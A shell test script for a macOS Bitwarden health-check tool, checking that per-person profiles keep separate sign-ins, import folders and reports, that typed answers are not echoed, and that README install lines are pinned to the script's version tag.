# mom, first run: sign in, report, then the list of exports. Three answers that are refused, then file 1.
printf '4\n1 1\nhunter2\n1\n' >"$WORK/tty-mom"
mu mom@example.com "$WORK/tty-mom" --user mom >"$WORK/mu1.log" 2>&1 || { cat "$WORK/mu1.log"; echo "FAIL mom's first run"; exit 1; }
expect "$WORK/mu1.log" 'using the report scripts beside this file' "a profile run from a checkout uses its own scripts"
expect "$WORK/mu1.log" "Profile mom: sign in to Bitwarden. Type mom's email" "a new profile is asked to sign in"
expect "$WORK/mu1.log" 'Profile mom: this run uses the vault of mom@example.com' "the run says whose vault the profile holds"
grep -qx 'profiles/mom/data login --raw' "$MU_BWLOG" || { cat "$MU_BWLOG"; echo "FAIL mom did not sign in to her own data folder"; exit 1; }
expect "$WORK/mu1.log" '^  1  Google Passwords.csv  \(chrome, saved [0-9-]+ [0-9:]+\)$' "the newest export is listed first, with its kind and time"
expect "$WORK/mu1.log" '^  2  Passwords.csv  \(apple, saved [0-9-]+ [0-9:]+\)$' "the second export is listed"
expect "$WORK/mu1.log" '^  3  Old Passwords.csv  \(chrome, saved [0-9-]+ [0-9:]+, older than 7 days\)$' "an old export is listed and marked as old"
! grep -q 'other.csv' "$WORK/mu1.log" || { echo "FAIL a csv that is not a password export was listed"; exit 1; }
[ "$(grep -o 'Each answer must be one of the numbers 1 to 3, used once' "$WORK/mu1.log" | wc -l | tr -d ' ')" = "3" ] || { cat "$WORK/mu1.log"; echo "FAIL a number past the list, a repeated number and a word must each be refused and asked again"; exit 1; }
! grep -q 'hunter2' "$WORK/mu1.log" || { echo "FAIL a refused answer was printed back (it could be a password)"; exit 1; }
expect "$WORK/mu1.log" "Moved Google Passwords.csv to Bitwarden Import/chrome-passwords-$TODAY.csv" "the chosen export is moved"
expect "$WORK/mu1.log" '2 other password export file\(s\) are still in Downloads, untouched' "the run says what it left in Downloads"
[ "$(LC_ALL=C ls "$MU_DL" | tr '\n' '|')" = "Old Passwords.csv|Passwords.csv|other.csv|" ] || { ls "$MU_DL"; echo "FAIL only the chosen export may leave Downloads"; exit 1; }
[ "$(ls "$MOM/Bitwarden Import" | tr '\n' '|')" = "chrome-passwords-$TODAY.csv|conflicts.md|new-for-bitwarden.csv|" ] || { echo "FAIL mom's import folder must hold her export and its diff, nothing else"; ls "$MOM/Bitwarden Import" || true; exit 1; }
grep -q 'spotify.com' "$MOM/Bitwarden Import/new-for-bitwarden.csv" && ! grep -q 'library.org' "$MOM/Bitwarden Import/new-for-bitwarden.csv" || { echo "FAIL mom's import file must come from her export only"; exit 1; }
expect "$WORK/mu1.log" "A summary to share with family \(counts only: no site, username or password\) is in .*/profiles/mom/Reports/Bitwarden Summary - mom\.html$" "the run prints where the summary to share is kept"
expect "$WORK/mu1.log" "These files are mom's. Import them only into the vault of mom@example.com" "the import step names the vault the files are for"
[ "$(ls "$MOM/Reports" | tr '\n' '|' | sed -E 's/[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{6}/STAMP/')" = "Bitwarden Report - mom STAMP.html|Bitwarden Summary - mom.html|progress.json|" ] || { echo "FAIL mom's Reports folder must hold one dated report, the summary and the progress file"; ls "$MOM/Reports" || true; exit 1; }
expect "$(newest_report "$MOM")" 'Logins with a password: 5 ·' "mom's report is her vault, in her own Reports folder"
expect "$(newest_report "$MOM")" '<strong>First check-up of this vault on this Mac: [0-9]+ entries flagged\.</strong>' "a first report says it is the first"
[ "$(stat -f %Lp "$MOM/Reports")$(stat -f %Lp "$(newest_report "$MOM")")$(stat -f %Lp "$MOM/Reports/progress.json")" = "700600600" ] || { echo "FAIL the Reports folder, the report and the progress file must be owner-only"; exit 1; }
[ "$(tail -1 "$WORK/mu1.log")" = "==> Done. The report is open in your browser. It is kept in $MOM/Reports, not on the Desktop. Your vault is locked again." ] || { tail -2 "$WORK/mu1.log"; echo "FAIL the closing line must say where the report is kept"; exit 1; }
[ ! -e "$MU_APP/data" ] && [ ! -e "$MU_APP/Bitwarden Import" ] && [ ! -e "$MU_APP/Reports" ] && [ -z "$(ls -A "$MU_HOME/Desktop")" ] || { echo "FAIL a profile run wrote to the shared sign-in, import folder or reports, or to the Desktop"; exit 1; }
[ "$(/usr/bin/jq 'type == "object" and length > 1000' "$MOM/2fa-directory.json")" = "true" ] && [ ! -e "$MU_APP/2fa-directory.json" ] || { echo "FAIL the two-step list must be kept in the person's own folder, nowhere shared"; exit 1; }
LIST_STAMP="$(stat -f '%m %i' "$MOM/2fa-directory.json")"
pass "a profile run signs in to its own folder and takes only the export typed for it"

# dad, straight after: his own sign-in, his own folders, and nothing of mom's is read or changed.
MOM_BEFORE="$(snapshot "$MOM")"
CALLS="$(wc -l <"$MU_BWLOG")"; : >"$MU_OPENLOG"
printf '1\n' >"$WORK/tty-dad"
mu dad@example.com "$WORK/tty-dad" --user dad >"$WORK/mu2.log" 2>&1 || { cat "$WORK/mu2.log"; echo "FAIL dad's first run"; exit 1; }
expect "$WORK/mu2.log" "Profile dad: sign in to Bitwarden" "the second person is asked to sign in, not to unlock the first person's vault"
expect "$WORK/mu2.log" 'Profile dad: this run uses the vault of dad@example.com' "the second run says it holds the second person's vault"
bw_calls_since "$CALLS" | grep -qx 'profiles/dad/data login --raw' || { echo "FAIL dad did not sign in to his own data folder"; exit 1; }
! bw_calls_since "$CALLS" | grep -qv '^profiles/dad/data ' || { bw_calls_since "$CALLS"; echo "FAIL dad's run called bw on another data folder"; exit 1; }
expect "$WORK/mu2.log" '^  1  Passwords.csv  \(apple, saved' "the export mom left is offered to dad"
[ "$(ls "$DAD/Bitwarden Import" | tr '\n' '|')" = "apple-passwords-$APPLE_DAY.csv|conflicts.md|new-for-bitwarden.csv|" ] || { echo "FAIL dad's import folder must hold his export and its diff"; ls "$DAD/Bitwarden Import" || true; exit 1; }
grep -q 'library.org' "$DAD/Bitwarden Import/new-for-bitwarden.csv" && ! grep -q 'spotify.com' "$DAD/Bitwarden Import/new-for-bitwarden.csv" || { echo "FAIL dad's import file must come from his export only"; exit 1; }
expect "$(newest_report "$DAD")" 'Logins with a password: 1 ·' "dad's report is his vault, in his own Reports folder"
[ "$(snapshot "$MOM")" = "$MOM_BEFORE" ] || { echo "FAIL dad's run changed mom's folder, reports or progress"; exit 1; }
grep -qxF "$(newest_report "$DAD")" "$MU_OPENLOG" && grep -qxF "$DAD/Bitwarden Import" "$MU_OPENLOG" && ! grep -q 'mom' "$MU_OPENLOG" || { cat "$MU_OPENLOG"; echo "FAIL dad's run must open his report and his import folder only"; exit 1; }
[ -f "$DAD/2fa-directory.json" ] || { echo "FAIL dad's copy of the two-step list must be in his own folder"; exit 1; }
pass "two profiles back to back keep separate sign-ins, import folders and reports"

# --summary-only: the summary to share is written and opened; no report, progress or import step.
DAD_REPORTS="$(ls "$DAD/Reports" | tr '\n' '|')"; DAD_PROGRESS="$(shasum "$DAD/Reports/progress.json")"; : >"$MU_OPENLOG"
mu dad@example.com /dev/null --user dad --summary-only >"$WORK/mu2s.log" 2>&1 || { cat "$WORK/mu2s.log"; echo "FAIL dad's --summary-only run"; exit 1; }
expect "$WORK/mu2s.log" "The summary to share is open in your browser: counts only, no site, username or password\. It is kept in .*/profiles/dad/Reports/Bitwarden Summary - dad\.html$" "--summary-only says where the summary is kept"
[ "$(ls "$DAD/Reports" | tr '\n' '|')" = "$DAD_REPORTS" ] && [ "$(shasum "$DAD/Reports/progress.json")" = "$DAD_PROGRESS" ] || { ls "$DAD/Reports"; echo "FAIL --summary-only wrote a report or changed the progress file"; exit 1; }
[ "$(cat "$MU_OPENLOG")" = "$DAD/Reports/Bitwarden Summary - dad.html" ] && ! grep -q 'Password exports in Downloads' "$WORK/mu2s.log" || { cat "$MU_OPENLOG"; echo "FAIL --summary-only must open the summary and nothing else, with no import step"; exit 1; }
! grep -qi 'dadbank\|Dad bank\|example\|href=' "$DAD/Reports/Bitwarden Summary - dad.html" || { echo "FAIL the summary holds a site, a name or a link"; exit 1; }
pass "--summary-only writes and opens the summary alone"

# mom again: her profile is still signed in, so this is an unlock. --logout-after with a bw that cannot
# sign out must end in an error and leave her signed in, not claim she is signed out.
printf 'skip\n' >"$WORK/tty-skip"; printf '\n' >"$WORK/tty-return"
# Before it: ten older reports, a file that is not a report, and a Desktop report left by an earlier version.
for d in 01 02 03 04 05 06 07 08 09 10; do echo old >"$MOM/Reports/Bitwarden Report - mom 2020-01-$d 000000.html"; done
echo keep >"$MOM/Reports/my notes.txt"; echo old >"$MU_HOME/Desktop/Bitwarden Report - mom.html"
DAD_BEFORE="$(snapshot "$DAD")"
CALLS="$(wc -l <"$MU_BWLOG")"
if FAKE_BW_LOGOUT_BUG=fails mu mom@example.com "$WORK/tty-return" --logout-after --user mom >"$WORK/mu3.log" 2>&1; then
  cat "$WORK/mu3.log"; echo "FAIL a run whose sign-out failed ended successfully"; exit 1
fi
expect "$WORK/mu3.log" 'Profile mom is signed in as mom@example.com. Unlock that vault' "a signed-in profile names its account before asking for the password"
bw_calls_since "$CALLS" | grep -qx 'profiles/mom/data unlock --raw' && ! bw_calls_since "$CALLS" | grep -q ' login ' || { echo "FAIL a signed-in profile must unlock, not sign in again"; exit 1; }
expect "$WORK/mu3.log" '^  1  Old Passwords.csv ' "with only an old export left, it is still listed, never taken silently"
expect "$WORK/mu3.log" 'each file that is mom' "the question names the profile"
expect "$WORK/mu3.log" 'Done. The report is open in your browser' "the run itself finished"
expect "$(newest_report "$MOM")" '<strong>0 fixed since [0-9-]+, [0-9]+ left\.</strong>' "a second report compares with the first"
expect "$WORK/mu3.log" "Removed 2 older report\(s\) from $MOM/Reports. The newest 10 are kept" "older reports are removed and counted"
[ "$(ls "$MOM/Reports"/Bitwarden\ Report*.html | wc -l | tr -d ' ')" = "10" ] && [ ! -e "$MOM/Reports/Bitwarden Report - mom 2020-01-02 000000.html" ] && [ -e "$MOM/Reports/Bitwarden Report - mom 2020-01-03 000000.html" ] || { ls "$MOM/Reports"; echo "FAIL the newest 10 reports must be kept and the oldest removed"; exit 1; }
[ -f "$MOM/Reports/my notes.txt" ] && [ -f "$MOM/Reports/progress.json" ] && [ -f "$MOM/Reports/Bitwarden Summary - mom.html" ] && [ "$(snapshot "$DAD")" = "$DAD_BEFORE" ] || { echo "FAIL clearing old reports touched something that is not one of this person's reports"; exit 1; }
[ "$(stat -f '%m %i' "$MOM/2fa-directory.json")" = "$LIST_STAMP" ] || { echo "FAIL mom's copy of the two-step list was downloaded again within a day"; exit 1; }
expect "$WORK/mu3.log" "An older report, 'Bitwarden Report - mom.html', is still on your Desktop" "a Desktop report from an earlier version is pointed out"
[ -f "$MU_HOME/Desktop/Bitwarden Report - mom.html" ] || { echo "FAIL the old Desktop report was removed without being asked"; exit 1; }
expect "$WORK/mu3.log" 'Profile mom: Bitwarden could NOT be signed out on this Mac' "a failed sign-out after a finished run is an error"
[ -f "$MOM/data/account" ] && [ -f "$MU_DL/Old Passwords.csv" ] || { echo "FAIL test setup: mom should still be signed in and the old export untouched"; exit 1; }
pass "--logout-after reports a sign-out that did not happen"

# A word at the list is refused and asked again; a keyboard that then stops answering is an error.
if mu mom@example.com "$WORK/tty-skip" --user mom exports >"$WORK/mu3b.log" 2>&1; then cat "$WORK/mu3b.log"; echo "FAIL the exports step ended successfully with no usable answer"; exit 1; fi
expect "$WORK/mu3b.log" 'Each answer must be one of the numbers 1 to 1, used once' "a word typed at the list is refused"
expect "$WORK/mu3b.log" 'no answer came from the keyboard' "a keyboard that stops answering is an error, not a silent exit"
[ -f "$MU_DL/Old Passwords.csv" ] || { echo "FAIL an export was moved without being chosen"; exit 1; }

if FAKE_BW_LOGOUT_BUG=silent mu mom@example.com /dev/null --user mom logout >"$WORK/mu4.log" 2>&1; then
  cat "$WORK/mu4.log"; echo "FAIL logout succeeded although bw stayed signed in"; exit 1
fi
expect "$WORK/mu4.log" 'Bitwarden could not be signed out' "logout checks that bw is signed out, not only that bw said so"
mu mom@example.com /dev/null --user mom logout >"$WORK/mu5.log" 2>&1 || { cat "$WORK/mu5.log"; echo "FAIL mom's logout"; exit 1; }
expect "$WORK/mu5.log" 'Profile mom: Bitwarden is signed out on this Mac' "logout signs the profile out"
expect "$WORK/mu5.log" 'still holds files with plain-text passwords: .*/profiles/mom/Bitwarden Import' "logout points at the import files the profile left behind"
[ ! -e "$MOM/data/account" ] && [ -f "$DAD/data/account" ] || { echo "FAIL logout must sign out that profile and no other"; exit 1; }
mu mom@example.com /dev/null logout --user mom >"$WORK/mu6.log" 2>&1 || { cat "$WORK/mu6.log"; echo "FAIL a second logout"; exit 1; }
expect "$WORK/mu6.log" 'Profile mom: Bitwarden was not signed in on this Mac' "a second logout says there was nothing to sign out"
if mu mom@example.com /dev/null --user mmo logout >"$WORK/mu7.log" 2>&1; then cat "$WORK/mu7.log"; echo "FAIL logout of a profile that does not exist succeeded"; exit 1; fi
expect "$WORK/mu7.log" 'no profile named mmo has been used on this Mac. Profiles here: dad mom' "a mistyped profile name is not reported as signed out"
[ ! -e "$MU_APP/profiles/mmo" ] || { echo "FAIL a mistyped logout created a profile"; exit 1; }
pass "logout signs out one profile, checks it, and refuses a name that was never used"

# dad again with --logout-after: unlock, run, lock, then sign out. The remaining old export is skipped.
CALLS="$(wc -l <"$MU_BWLOG")"
mu dad@example.com "$WORK/tty-return" --user dad --logout-after >"$WORK/mu8.log" 2>&1 || { cat "$WORK/mu8.log"; echo "FAIL dad's --logout-after run"; exit 1; }
expect "$WORK/mu8.log" 'Profile dad is signed in as dad@example.com' "the second run of a profile unlocks it"
expect "$WORK/mu8.log" 'No file chosen; skipping the import step. Nothing in Downloads was touched' "Return at the list skips the import step"
[ "$(tail -1 "$WORK/mu8.log")" = "==> Profile dad: Bitwarden is signed out on this Mac." ] || { tail -3 "$WORK/mu8.log"; echo "FAIL --logout-after must end by saying the profile is signed out"; exit 1; }
[ "$(bw_calls_since "$CALLS" | grep -E ' (lock|logout)$' | tr '\n' '|')" = "profiles/dad/data lock|profiles/dad/data logout|" ] || { bw_calls_since "$CALLS"; echo "FAIL the run must lock, then sign out, once each"; exit 1; }
[ ! -e "$DAD/data/account" ] && [ -f "$MU_DL/Old Passwords.csv" ] || { echo "FAIL dad is still signed in, or an export that was not chosen was moved"; exit 1; }
pass "--logout-after locks and signs the profile out when the run ends"

# The dedupe step for a profile, with --user after the step words: the plan lands in that profile's folder.
rm "$MU_DL/Old Passwords.csv"
mu kelly@example.com /dev/null dedupe exact --user kelly >"$WORK/mu9.log" 2>&1 || { cat "$WORK/mu9.log"; echo "FAIL a profile's dedupe preview"; exit 1; }
expect "$WORK/mu9.log" 'Plan: .*/profiles/kelly/Dedupe Plan/plan-exact.md' "a profile's dedupe plan is written to its own folder"
[ -f "$MU_APP/profiles/kelly/Dedupe Plan/plan-exact.md" ] && [ ! -e "$MU_APP/Dedupe Plan" ] && [ ! -e "$MOM/Dedupe Plan" ] || { echo "FAIL the dedupe plan landed outside the profile's folder"; exit 1; }
mu kelly@example.com "$WORK/tty-skip" --user kelly exports >"$WORK/mu9b.log" 2>&1 || { cat "$WORK/mu9b.log"; echo "FAIL a profile's exports step"; exit 1; }
expect "$WORK/mu9b.log" "To import kelly's old passwords, put their export in the Downloads folder of this Mac" "with no export, a profile is told to bring that person's own export"
expect "$WORK/mu9b.log" "not kelly's" "the prompt warns that this Mac's Passwords app is not that person's"
mu kelly@example.com /dev/null --user kelly fixurls >"$WORK/mu9c.log" 2>&1 || { cat "$WORK/mu9c.log"; echo "FAIL a profile's AutoFill preview"; exit 1; }
expect "$WORK/mu9c.log" 'Plan: .*/profiles/kelly/Dedupe Plan/plan-fixurls.md' "a profile's AutoFill plan is written to its own folder"
pass "dedupe, the AutoFill fix and exports follow the profile"

# No --user: the shared sign-in and folders, and the silent export pick-up, as before profiles.
MOM_BEFORE="$(snapshot "$MOM")"; DAD_BEFORE="$(snapshot "$DAD")"
cp "$FX/chrome.csv" "$MU_DL/Google Passwords.csv"
CALLS="$(wc -l <"$MU_BWLOG")"
mu owner@example.com /dev/null >"$WORK/mu10.log" 2>&1 || { cat "$WORK/mu10.log"; echo "FAIL a run without --user"; exit 1; }
! grep -q 'Profile\|Type the number' "$WORK/mu10.log" || { cat "$WORK/mu10.log"; echo "FAIL a run without --user mentioned a profile or asked which export to take"; exit 1; }
expect "$WORK/mu10.log" '^==> Sign in to Bitwarden. Type your email, then your master password \(nothing shows while typing\), then the two-step code if asked\.$' "without --user the sign-in wording is unchanged"
expect "$WORK/mu10.log" "Moved Google Passwords.csv to Bitwarden Import/chrome-passwords-$TODAY.csv" "without --user a fresh export is still picked up without asking"
! bw_calls_since "$CALLS" | grep -qv '^data ' || { bw_calls_since "$CALLS"; echo "FAIL a run without --user must use the shared data folder only"; exit 1; }
[ -f "$MU_APP/data/account" ] && [ -f "$MU_APP/Bitwarden Import/new-for-bitwarden.csv" ] || { echo "FAIL a run without --user must use the shared sign-in and import folder"; exit 1; }
expect "$(newest_report "$MU_APP")" 'Logins with a password: 5 ·' "without --user the report goes to the shared Reports folder"
[ "$(ls "$MU_APP/Reports" | tr '\n' '|' | sed -E 's/[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{6}/STAMP/')" = "Bitwarden Report STAMP.html|Bitwarden Summary.html|progress.json|" ] || { ls "$MU_APP/Reports"; echo "FAIL the shared Reports folder must hold one dated report, the summary and the progress file"; exit 1; }
[ "$(tail -1 "$WORK/mu10.log")" = "==> Done. The report is open in your browser. It is kept in $MU_APP/Reports, not on the Desktop. Your vault is locked again." ] || { tail -2 "$WORK/mu10.log"; echo "FAIL without --user the closing line must name the shared Reports folder"; exit 1; }
[ "$(ls -A "$MU_HOME/Desktop")" = "Bitwarden Report - mom.html" ] && ! grep -q 'older report' "$WORK/mu10.log" || { echo "FAIL a run without --user wrote to the Desktop, or pointed at another person's old report"; exit 1; }
[ "$(bw_calls_since "$CALLS" | tail -1)" = "data lock" ] || { echo "FAIL without --logout-after the run must end by locking, not signing out"; exit 1; }
[ "$(snapshot "$MOM")" = "$MOM_BEFORE" ] && [ "$(snapshot "$DAD")" = "$DAD_BEFORE" ] || { echo "FAIL a run without --user changed a profile's folder"; exit 1; }
mu owner@example.com /dev/null logout >"$WORK/mu11.log" 2>&1 || { cat "$WORK/mu11.log"; echo "FAIL logout without --user"; exit 1; }
expect "$WORK/mu11.log" '^==> Bitwarden is signed out on this Mac\.$' "logout without --user signs out the shared sign-in"
[ ! -e "$MU_APP/data/account" ] || { echo "FAIL the shared sign-in is still signed in"; exit 1; }
pass "without --user everything is where it was; logout works there too"

# No person is named in the tool, its messages, its tests or its docs: whoever shares the paste line is
# "the person who sent you this line". Cannot catch a name other than the one it looks for.
! git grep -nw -e 'R[o]b' -- . ':!tests/fixture' || { echo "FAIL a personal name is hard-coded in the tool, its tests or its docs"; exit 1; }
expect bw-health.sh 'Send a screenshot of this window to the person who sent you this line' "the generic failure message names no one"
expect bw_dedupe.py 'tell the person who sent you this line what this window printed' "the read-back stop message names no one"
pass "no personal name is hard-coded; messages say 'the person who sent you this line'"

# The README names every fetched file and test file, and its paste lines use the tag of the script's version.
# Cannot catch a wrong description, only a missing or renamed file.
for f in bw-health.sh $FILES tests/run.sh; do
  grep -qF "\`$f\`" README.md || { echo "FAIL README does not mention $f"; exit 1; }
done
BASE="https://raw.githubusercontent.com/nellirob92/bw-health/v$VERSION"
grep -qxF 'RELEASE_URL="https://raw.githubusercontent.com/nellirob92/bw-health/v$VERSION"' bw-health.sh || { echo "FAIL bw-health.sh must fetch from the tag of its own VERSION"; exit 1; }
[ "$(grep -c 'curl -fsSL' README.md)" -gt 0 ] && [ "$(grep -c 'curl -fsSL' README.md)" = "$(grep -cF "curl -fsSL $BASE/bw-health.sh" README.md)" ] || { echo "FAIL every README paste line must use the tag of the script's VERSION ($BASE)"; exit 1; }
pass "the README names every fetched file and its paste lines are pinned to the script's version tag"

echo; echo "ALL TESTS PASSED"
